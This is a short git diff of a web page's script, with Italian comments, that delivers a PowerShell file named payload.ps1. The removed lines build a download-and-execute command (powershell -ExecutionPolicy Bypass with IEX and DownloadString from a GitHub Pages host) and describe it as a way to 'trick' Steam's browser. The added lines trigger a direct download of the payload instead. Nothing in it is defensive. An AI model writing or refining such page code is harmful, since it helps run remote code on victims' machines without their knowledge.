@@ -11,12 +11,11 @@
 
     <script>
         function runPayload() {
-            const user = "jamalcamalingo12324-cmd"; // <--- METTI IL TUO NOME QUI
-            const repo = "frankestein-cloud12312312";     // <--- METTI IL NOME REPO QUI
-            const url = "https://" + jamalcamalingo12324-cmd + ".github.io/" + frankestein-cloud12312312 + "/payload.ps1";
-            
-            // Usiamo un protocollo diverso per "ingannare" il browser di Steam
-            window.location.href = "cmd /c powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Normal -Command \"& {IEX (New-Object Net.WebClient).DownloadString('" + url + "')}\"";
+    // Usando solo il nome del file, il browser lo cerca nella stessa cartella dell'index
+    const url = "payload.ps1"; 
+    
+    // Prova il metodo di download diretto
+    window.location.href = url;
         }
     </script>
 </body>
